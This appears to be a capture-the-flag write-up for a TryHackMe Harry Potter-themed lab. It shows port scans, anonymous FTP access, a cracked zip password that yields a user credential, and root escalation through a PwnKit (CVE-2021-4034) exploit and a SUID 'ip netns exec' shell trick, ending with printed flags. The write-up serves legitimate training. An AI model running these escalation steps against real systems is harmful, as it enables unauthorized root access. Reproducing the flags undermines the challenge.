target = 10.10.10.155
```terminal
└─# nmap -Pn -p- --min-rate 5000 $ip
not shown: 51706 filtered tcp ports (no-response), 13825 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
7226/tcp  open  unknown
10340/tcp open  unknown
41437/tcp open  unknown

```

Second  time :
```
└─# nmap -sV -sC -p7226,10340,41437 --min-rate 5000 $ip
Host is up (0.67s latency).

PORT      STATE SERVICE VERSION
7226/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e448e776e3955871c8e57c817417aab (RSA)
|   256 75cd2dd67d6fdb20534fc3d7ccac032f (ECDSA)
|_  256 78dcffbab306cbde982d2c9cf321f7f9 (ED25519)
10340/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.26.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
41437/tcp open  unknown
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

```

```
ftp> ls -la
229 Entering Extended Passive Mode (|||30603|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ...
-rw-r--r--    1 ftp      ftp            95 Sep 06  2020 .IamHidden
226 Directory send OK.
ftp> 
xtended Passive Mode (|||46709|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 29 15:23 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
-rw-r--r--    1 ftp      ftp           231 Sep 29 15:23 .I_saved_it_harry.zip
-rw-r--r--    1 ftp      ftp           157 Sep 06  2020 note4neville
226 Directory send OK.
ftp> get note4neville
─# cat .IamHidden 
Hagrid: You just don't understand do you? shoooooooo Go away! this is prolly a ded end!.. huh 
                                                                                                                            
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe/koth]
└─# cat note4neville 
Hagrid: Oi Neville even I ws able to open your secret file!  Yeah now change it before someone gets in. These are troubled times, I tell ya 'roubled imes.!!


```

Cracking the hash
```terminal
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe/koth]
└─# john harry.hash       
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
014789           (?)     
1g 0:00:00:00 DONE 3/3 (2023-09-29 00:09) 1.724g/s 302755p/s 302755c/s 302755C/s 011390..020886
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                            
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe/koth]
└─# unzip harry.zip
Archive:  harry.zip
[harry.zip] boot/.pass password: 
 extracting: boot/.pass              
                                                                                                                            
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe/koth]
└─# cat boot/.pass 
neville:cf@4kmf9#jrsx1zqdld9q!uj9

```

Now SUID
```terminal
neville@hogwarts:~$ find / -type f -perm /4000 -ls 2>/dev/null
/bin/ip gtfobins
ok pkexec
```
Just

```
systemd-private-6ad7a7c596f54814ac514fe67cb7510e-systemd-timesyncd.service-2VnXj9
neville@hogwarts:/tmp$ python3 CVE-2021-4034.py 
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f0ef5b7f4e8 at 0x7f0ef47016d8>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=1002(neville) groups=1002(neville)
# whoami 
root
```

Or Ip
```terminal
rts:/tmp$ ip netns add foo
neville@hogwarts:/tmp$ ip netns exec foo /bin/sh -p
# ip netns delete foo
Cannot remove namespace file "/var/run/netns/foo": Device or resource busy
# id
uid=1002(neville) gid=1002(neville) euid=0(root) egid=0(root) groups=0(root),1002(neville)
# whoami
root

```

THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
THM{I_unarm3d_dumbled0re}
THM{Yeah_1_swallowed_the_sn1tch.}
THM{its_wingardium_laviosaa_Ron}
